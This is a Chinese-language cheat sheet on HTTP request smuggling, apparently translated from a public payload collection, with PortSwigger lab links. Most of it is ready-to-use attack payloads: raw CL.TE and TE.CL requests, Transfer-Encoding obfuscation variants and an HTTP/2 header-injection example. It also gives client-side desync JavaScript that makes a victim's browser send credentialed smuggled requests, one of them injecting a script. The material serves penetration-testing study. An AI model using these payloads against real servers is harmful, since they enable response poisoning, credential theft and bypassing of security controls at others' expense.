# 请求走私

> 当多个“事物”处理请求，但在确定请求开始/结束的位置上存在分歧时，就会发生HTTP请求走私。这种分歧可以被用来干扰另一个用户的请求/响应或绕过安全控制。它通常是由于优先考虑不同的HTTP头（Content-Length与Transfer-Encoding）、处理格式错误的头的差异（例如是否忽略带有意外空格的头部）、从较新协议降级请求，或者由于部分请求超时时机不同和应该丢弃的差异而发生。

## 摘要

* [工具](#工具)
* [CL.TE漏洞](#cl.te-漏洞)
* [TE.CL漏洞](#te.cl-漏洞)
* [TE.TE行为：混淆TE头](#te.te-行为-混淆-te头)
* [参考资料](#参考资料)

## 工具

* [HTTP请求走私者 / BApp商店](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)
* [走私者](https://github.com/defparam/smuggler)
* [简单HTTP走私者生成器 CL.TE TE.CL](https://github.com/dhmosfunk/simple-http-smuggler-generator) > 该工具不提供自动化利用。你必须识别注入点并手动利用它！

## 关于CL.TE | TE.CL漏洞

如果你想手动利用HTTP请求走私，你会遇到一些问题，特别是在TE.CL漏洞中，你必须计算第二个请求（恶意请求）的块大小，正如portswigger所建议的`手动修复请求走私攻击中的长度字段可能会有些棘手。`因此，你可以使用[简单HTTP走私者生成器 CL.TE TE.CL](https://github.com/dhmosfunk/simple-http-smuggler-generator)，手动利用CL.TE TE.CL漏洞，并了解这个漏洞是如何工作的以及你可以如何利用它。这个工具只为你提供具有有效块大小的第二个请求（TE.CL），但不提供自动化利用。你必须识别注入点并手动利用它！

## CL.TE漏洞

> 前端服务器使用Content-Length头，后端服务器使用Transfer-Encoding头。

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

示例：

```powershell
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

挑战: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

## TE.CL漏洞

> 前端服务器使用Transfer-Encoding头，后端服务器使用Content-Length头。

```powershell
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

示例：

```powershell
POST / HTTP/1.1
Host: domain.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0


```

:warning: 要使用Burp Repeater发送此请求，您首先需要转到Repeater菜单并确保未选中“更新Content-Length”选项。您需要在最后的0之后包含尾随序列\r\n。

挑战：https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

## TE.TE行为：混淆TE头

> 前端和后端服务器都支持Transfer-Encoding头，但可以通过某种方式混淆头部，诱导其中一个服务器不处理它。

```powershell
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[
]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

挑战：https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header

## HTTP/2请求走私

如果机器将您的HTTP/2请求转换为HTTP/1.1，您可以将无效的内容长度头、传输编码头或新行（CRLF）走私到转换后的请求中，则可能会发生HTTP/2请求走私。如果在HTTP/2头中隐藏了HTTP/1.1请求，也可以在对HTTP/2请求的GET请求中发生HTTP/2请求走私。

```
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```

挑战: https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling

## 客户端同步失效

在某些路径上，服务器不期望收到POST请求，将其视为简单的GET请求，忽略有效载荷，例如：

```
POST / HTTP/1.1
Host: www.example.com
Content-Length: 37

GET / HTTP/1.1
Host: www.example.com
```

可能被当作两个请求处理，而实际上应该只有一个。当后端服务器响应两次时，前端服务器会假设只有第一个响应与此请求相关。

为了利用这一点，攻击者可以使用JavaScript触发受害者向易受攻击的网站发送POST请求：

```javascript
fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'})
```

这可以用于：

* 让易受攻击的网站在攻击者可以访问的地方存储受害者的凭据
* 让受害者向网站发送漏洞（例如，对于攻击者无法访问的内部网站，或者为了使攻击更难归因）
* 让受害者执行任意JavaScript，就像它来自网站一样

例如：

```javascript
fetch('https://www.example.com/redirect', {
    method: 'POST',
        body: `HEAD /404/ HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
        credentials: 'include',
        mode: 'cors' // 抛出错误而不是遵循重定向
}).catch(() => {
        location = 'https://www.example.com/'
})
```

告诉受害者浏览器向www.example.com/redirect发送POST请求。这将返回一个被CORS阻止的重定向，并导致浏览器执行catch块，转到www.example.com。

www.example.com现在错误地处理了POST正文中的HEAD请求，而不是浏览器的GET请求，并在回复下一个误解的第三个（`GET /x?x=<script>...`）请求之前返回404未找到和内容长度，最后是浏览器的实际GET请求。
由于浏览器只发送了一个请求，它接受对HEAD请求的响应作为对其GET请求的响应，并将第三个和第四个响应解释为响应的正文，从而执行攻击者的脚本。

挑战：https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync

## 参考资料

* [PortSwigger - 请求走私教程](https://portswigger.net/web-security/request-smuggling) 和 [PortSwigger - 请求走私重生](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
* [HTTP请求走私入门指南 - Busra Demir - 2020年10月16日](https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)
* [高级请求走私 - PortSwigger](https://portswigger.net/web-security/request-smuggling/advanced#http-2-request-smuggling)
* [浏览器驱动的同步失效攻击：HTTP请求走私的新前沿 - James Kettle - 2022年8月10日](https://portswigger.net/research/browser-powered-desync-attacks)